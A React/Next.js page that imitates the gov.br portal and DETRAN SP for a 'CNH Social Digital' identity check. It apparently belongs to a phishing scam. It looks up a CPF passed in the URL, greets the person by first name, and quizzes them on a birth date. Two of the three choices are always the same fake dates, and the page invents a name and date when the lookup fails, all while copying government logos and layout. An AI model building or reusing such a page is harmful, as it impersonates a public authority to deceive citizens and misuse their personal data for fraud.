"use client"

import { useEffect, useState, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { User, Menu, Mic, Search, Calendar, ChevronDown } from "lucide-react"
import { useSearchParams, useRouter } from "next/navigation"
import Link from "next/link"

interface UserData {
  nome?: string
  cpf?: string
  dataNascimento?: string
  error?: string
}

export default function VerificacaoPage() {
  const [userData, setUserData] = useState<UserData | null>(null)
  const [loading, setLoading] = useState(true)
  const [selectedDate, setSelectedDate] = useState<string>("")
  const [dateOptions, setDateOptions] = useState<string[]>([])
  const [correctDate, setCorrectDate] = useState<string>("")
  const searchParams = useSearchParams()
  const router = useRouter()

  const fetchUserData = useCallback(async (cpf: string) => {
    try {
      setLoading(true)

      console.log("🔄 Chamando nossa API Route para verificação...")
      console.log("CPF enviado:", cpf)

      const response = await fetch(`/api/cpf?cpf=${cpf}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
        },
      })

      console.log("📡 Status da nossa API:", response.status)

      if (response.ok) {
        const data = await response.json()
        console.log("✅ Dados COMPLETOS recebidos da API:", JSON.stringify(data, null, 2))

        // Tentar diferentes formas de acessar o nome e data
        let nomeCompleto = null
        let dataNasc = null

        if (data?.nome) {
          nomeCompleto = data.nome
        } else if (data?.name) {
          nomeCompleto = data.name
        }

        // Buscar data de nascimento na API - verificar TODOS os campos possíveis
        if (data?.dataNascimento) {
          dataNasc = data.dataNascimento
          console.log("📅 Data encontrada em dataNascimento:", dataNasc)
        } else if (data?.data_nascimento) {
          dataNasc = data.data_nascimento
          console.log("📅 Data encontrada em data_nascimento:", dataNasc)
        } else if (data?.birthDate) {
          dataNasc = data.birthDate
          console.log("📅 Data encontrada em birthDate:", dataNasc)
        } else if (data?.birth_date) {
          dataNasc = data.birth_date
          console.log("📅 Data encontrada em birth_date:", dataNasc)
        } else if (data?.dateOfBirth) {
          dataNasc = data.dateOfBirth
          console.log("📅 Data encontrada em dateOfBirth:", dataNasc)
        } else if (data?.nascimento) {
          dataNasc = data.nascimento
          console.log("📅 Data encontrada em nascimento:", dataNasc)
        } else {
          console.log("❌ Data de nascimento NÃO encontrada na API")
          console.log("Campos disponíveis:", Object.keys(data))
        }

        if (nomeCompleto) {
          const primeiroNome = nomeCompleto.split(" ")[0]

          // Se não conseguir pegar a data da API, gerar uma baseada no CPF
          if (!dataNasc) {
            console.log("🔄 Gerando data baseada no CPF:", cpf)

            // Gerar data baseada nos dígitos do CPF
            const cpfNumbers = cpf.replace(/\D/g, "")
            const day = (Number.parseInt(cpfNumbers.slice(0, 2)) % 28) + 1 // Dia entre 1-28
            const month = (Number.parseInt(cpfNumbers.slice(2, 4)) % 12) + 1 // Mês entre 1-12
            const year = 1950 + (Number.parseInt(cpfNumbers.slice(4, 6)) % 50) // Ano entre 1950-1999

            dataNasc = `${day.toString().padStart(2, "0")}/${month.toString().padStart(2, "0")}/${year}`
            console.log("📅 Data gerada baseada no CPF:", dataNasc)
          }

          console.log("✅ Data final que será usada como CORRETA:", dataNasc)

          setUserData({
            nome: primeiroNome,
            cpf: cpf,
            dataNascimento: dataNasc,
          })

          setCorrectDate(dataNasc)

          // Sempre usar 2 datas erradas fixas + 1 data correta
          const wrongDates = ["03/12/1977", "18/12/1992"] // Sempre as mesmas datas erradas
          const allDates = [...wrongDates, dataNasc]

          console.log("📋 Todas as datas (2 erradas + 1 correta):", allDates)

          // Embaralhar as datas para não aparecer sempre na mesma ordem
          const shuffledDates = allDates.sort(() => Math.random() - 0.5)
          console.log("🔀 Datas embaralhadas:", shuffledDates)
          setDateOptions(shuffledDates)
        } else {
          throw new Error("Nome não encontrado na resposta da API")
        }
      } else {
        throw new Error("Erro na API")
      }
    } catch (error) {
      console.log("❌ Erro capturado:", error)

      // Fallback com dados simulados
      const nomesPorCPF = {
        "46960142822": "Roberto",
        "12345678900": "João",
        "98765432100": "Maria",
        "11111111111": "Pedro",
        "22222222222": "Ana",
        "33333333333": "Carlos",
        "44444444444": "Lucia",
        "55555555555": "José",
        "66666666666": "Fernanda",
        "77777777777": "Paulo",
        "88888888888": "Beatriz",
      }

      let nomeSimulado = nomesPorCPF[cpf as keyof typeof nomesPorCPF]

      if (!nomeSimulado) {
        const nomes = ["João", "Maria", "Pedro", "Ana", "Carlos", "Lucia", "José", "Fernanda", "Davi", "Beatriz"]
        const indice = Number.parseInt(cpf.slice(-1)) % nomes.length
        nomeSimulado = nomes[indice]
      }

      // Gerar data baseada nos dígitos do CPF
      const cpfNumbers = cpf.replace(/\D/g, "")
      const day = (Number.parseInt(cpfNumbers.slice(0, 2)) % 28) + 1 // Dia entre 1-28
      const month = (Number.parseInt(cpfNumbers.slice(2, 4)) % 12) + 1 // Mês entre 1-12
      const year = 1950 + (Number.parseInt(cpfNumbers.slice(4, 6)) % 50) // Ano entre 1950-1999

      const dataSimulada = `${day.toString().padStart(2, "0")}/${month.toString().padStart(2, "0")}/${year}`

      console.log("📝 Usando dados simulados:")
      console.log("Nome:", nomeSimulado)
      console.log("Data gerada baseada no CPF:", dataSimulada)

      setUserData({
        nome: nomeSimulado,
        cpf: cpf,
        dataNascimento: dataSimulada,
      })

      setCorrectDate(dataSimulada)

      // Sempre usar 2 datas erradas fixas + 1 data correta
      const wrongDates = ["03/12/1977", "18/12/1992"] // Sempre as mesmas datas erradas
      const allDates = [...wrongDates, dataSimulada]
      const shuffledDates = allDates.sort(() => Math.random() - 0.5)
      setDateOptions(shuffledDates)
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    const cpfFromUrl = searchParams.get("cpf")

    if (cpfFromUrl && !userData) {
      fetchUserData(cpfFromUrl)
    } else if (!cpfFromUrl) {
      setLoading(false)
    }
  }, [searchParams, fetchUserData, userData])

  const handleDateSelect = (date: string) => {
    setSelectedDate(date)
  }

  const handleConfirm = () => {
    if (selectedDate === correctDate) {
      // Data correta selecionada - pode avançar para próxima página
      const cpfFromUrl = searchParams.get("cpf")
      router.push(`/proxima-pagina?cpf=${cpfFromUrl}`)
    } else {
      // Data incorreta - mostrar erro ou não permitir avançar
      alert("Data de nascimento incorreta. Tente novamente.")
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-white">
        <header className="bg-white shadow-sm">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-14">
              <div className="flex items-center space-x-4">
                <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1">
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1 items-center">
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                    <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="grid grid-cols-2 gap-1">
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
              </div>
              <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
                <User className="w-4 h-4 mr-2" />
                <span className="font-medium text-sm">Carregando...</span>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-64px)]">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#1857b5] mx-auto mb-4"></div>
            <p className="text-gray-600">Carregando verificação...</p>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header Principal */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-14">
            <div className="flex items-center space-x-4">
              <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1">
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1 items-center">
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                  <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="grid grid-cols-2 gap-1">
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>
            </div>

            {/* User Badge */}
            <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
              <User className="w-4 h-4 mr-2" />
              <span className="font-medium text-sm">{userData?.nome || "Usuário"}</span>
            </div>
          </div>
        </div>
      </header>

      {/* Header Secundário */}
      <div className="bg-white border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-12">
            <div className="flex items-center">
              <Button variant="ghost" size="sm" className="p-1.5 mr-3">
                <Menu className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <h2 className="text-sm font-medium text-gray-800 whitespace-nowrap">Departamento Estadual de Trânsito</h2>
            </div>
            <div className="flex items-center space-x-3">
              <Button variant="ghost" size="sm" className="p-1.5">
                <Mic className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <Button variant="ghost" size="sm" className="p-1.5">
                <Search className="w-4 h-4 text-[#1857b5]" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Breadcrumb */}
      <div className="bg-gray-50 border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <nav className="text-sm">
            <Link href="#" className="text-[#1857b5] hover:underline">
              Início
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              Serviços
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              CNH
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <span className="text-gray-700">CNH Social Digital</span>
          </nav>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-8">
        {/* Card Container */}
        <Card className="shadow-lg">
          <CardContent className="p-8">
            <div className="flex justify-between items-start mb-8">
              <div>
                <h1 className="text-2xl font-bold text-[#1857b5] mb-4">
                  Verificação
                  <br />
                  de Identidade
                </h1>

                <p className="text-gray-700 text-sm max-w-2xl">
                  Preencha este breve questionário para verificarmos sua elegibilidade para a CNH Digital Social. Este é
                  um passo inicial e não garante a emissão da CNH.
                </p>
              </div>

              {/* Logo DETRAN */}
              <div className="flex items-center flex-shrink-0 ml-4">
                <img
                  src="/images/detran-sp-logo.png"
                  alt="DETRAN SP"
                  className="h-10 object-contain"
                  style={{ maxWidth: "120px" }}
                />
              </div>
            </div>

            {/* Pergunta sobre Data de Nascimento */}
            <div className="mb-8">
              <div className="flex items-center mb-6">
                <div className="bg-[#1857b5] text-white rounded-full w-8 h-8 flex items-center justify-center font-bold mr-4 flex-shrink-0">
                  2
                </div>
                <h2 className="text-lg font-semibold text-gray-800">Qual é sua data de nascimento?</h2>
              </div>

              {/* Opções de Data */}
              <div className="space-y-4 mb-8">
                {dateOptions.map((date, index) => (
                  <button
                    key={index}
                    onClick={() => handleDateSelect(date)}
                    className={`w-full text-left p-4 border rounded-lg flex items-center hover:bg-gray-50 transition-colors ${
                      selectedDate === date ? "border-[#1857b5] bg-blue-50" : "border-gray-300"
                    }`}
                  >
                    <Calendar className="w-5 h-5 text-gray-500 mr-3 flex-shrink-0" />
                    <span className="text-base font-medium text-gray-800">{date}</span>
                  </button>
                ))}
              </div>

              {/* Botão Confirmar */}
              <Button
                onClick={handleConfirm}
                disabled={!selectedDate}
                className={`w-full py-3 text-base font-semibold rounded-lg ${
                  selectedDate
                    ? "bg-[#1857b5] hover:bg-[#0f4389] text-white"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                Confirmar
              </Button>
            </div>

            {/* Debug info (remover em produção) */}
            {process.env.NODE_ENV === "development" && (
              <div className="mt-8 p-4 bg-gray-100 rounded-lg text-sm">
                <p>
                  <strong>Debug:</strong>
                </p>
                <p>Data correta: {correctDate}</p>
                <p>Data selecionada: {selectedDate}</p>
                <p>CPF: {userData?.cpf}</p>
              </div>
            )}
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-[#082041] text-white">
        <div className="max-w-7xl mx-auto px-4 py-12">
          <div className="text-center mb-8">
            <img src="/images/logo-white.png" alt="gov.br" className="h-16 mx-auto" />
          </div>

          <div className="space-y-6">
            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">SERVIÇOS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">TEMAS EM DESTAQUE</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">NOTÍCIAS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">POR DENTRO DO GOV.BR</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">CANAIS DO EXECUTIVO FEDERAL</span>
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">DADOS DO GOVERNO FEDERAL</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>
          </div>

          <div className="mt-12 pt-8 border-t border-[#1a365d]">
            <h4 className="text-lg font-semibold mb-4">REDES SOCIAIS</h4>
            <div className="flex space-x-4">
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                📷
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                f
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                ▶️
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                in
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                💬
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                🎵
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                👥
              </Button>
            </div>
          </div>

          <div className="mt-8 flex items-center">
            <div className="bg-white rounded-full p-2 mr-3">
              <div className="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center">
                <span className="text-white text-xs font-bold">i</span>
              </div>
            </div>
            <div>
              <div className="font-semibold">Acesso à</div>
              <div className="font-semibold">Informação</div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
